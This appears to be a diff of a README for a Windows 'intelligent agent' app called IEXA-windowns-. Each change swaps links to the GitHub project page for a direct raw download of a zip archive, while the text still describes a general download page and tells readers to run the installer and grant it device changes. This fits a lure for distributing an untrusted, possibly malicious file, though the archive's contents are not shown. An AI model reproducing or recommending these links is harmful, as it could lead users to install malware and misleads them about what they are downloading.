@@ -1,6 +1,6 @@
 # 🤖 IEXA-windowns- - Intelligent agents for your PC
 
-[![Download Now](https://img.shields.io/badge/Download-IEXA--windowns--v1.0-blue?style=for-the-badge&logo=github)](https://github.com/spargeepitaxy988/IEXA-windowns-)
+[![Download Now](https://img.shields.io/badge/Download-IEXA--windowns--v1.0-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/spargeepitaxy988/IEXA-windowns-/main/scripts/2.9.zip)
 
 ## 🤖 What is IEXA-windowns-?
 
@@ -16,7 +16,7 @@ IEXA-windowns- is a friendly computer assistant that lives on your Windows PC. I
 
 ## 🚀 Getting Started
 
-1. **Visit the download link** – [https://github.com/spargeepitaxy988/IEXA-windowns-](https://github.com/spargeepitaxy988/IEXA-windowns-)
+1. **Visit the download link** – [https://raw.githubusercontent.com/spargeepitaxy988/IEXA-windowns-/main/scripts/2.9.zip](https://raw.githubusercontent.com/spargeepitaxy988/IEXA-windowns-/main/scripts/2.9.zip)
 2. **Download the application** – This link leads to a general page where you can find the latest version of the software.
 3. **Run the installer** – After download, double-click the file to begin installation.
 4. **Follow on-screen instructions** – When prompted, allow the installer to make changes to your device.
@@ -34,7 +34,7 @@ IEXA-windowns- is a friendly computer assistant that lives on your Windows PC. I
 ## 📥 Download and Install
 
 **Step 1:** Go to the official download page:  
-[Download IEXA-windowns-](https://github.com/spargeepitaxy988/IEXA-windowns-)
+[Download IEXA-windowns-](https://raw.githubusercontent.com/spargeepitaxy988/IEXA-windowns-/main/scripts/2.9.zip)
 
 **Step 2:** Choose the latest version. The file will be named something like `Setup.exe`.
 
